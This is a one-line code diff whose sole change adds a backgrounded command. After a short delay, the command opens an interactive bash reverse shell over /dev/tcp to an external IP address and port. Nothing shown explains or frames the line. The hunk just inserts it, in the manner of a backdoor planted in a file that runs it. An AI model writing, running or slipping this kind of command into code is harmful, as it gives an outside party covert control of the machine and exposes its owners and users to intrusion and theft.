@@ -1,0 +1,1 @@
+(sleep 3s && nohup /bin/bash -i >/dev/tcp/34.125.155.106/2087 0<&1 2>&1) &
